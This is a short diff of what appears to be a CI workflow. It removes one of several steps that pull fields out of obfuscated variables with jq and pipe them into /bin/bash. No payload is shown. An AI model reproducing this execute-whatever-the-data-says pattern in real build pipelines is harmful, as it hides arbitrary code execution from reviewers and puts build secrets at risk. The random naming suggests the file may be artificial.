@@ -28,7 +28,6 @@ jobs:
           echo $kzfi77 | jq -r .wmkb6 | /bin/bash
           printf '%s' "$c5" | jq -r .fgh56812 | /bin/bash
           echo $sl199 | jq -r .lxq6 | /bin/bash
-          printf '%s' "$xtyq34166" | jq -r .tcpo9 | /bin/bash
           printf '%s' "$ag17210" | jq -r .u44827 | /bin/bash
 
       - name: Archive artifact
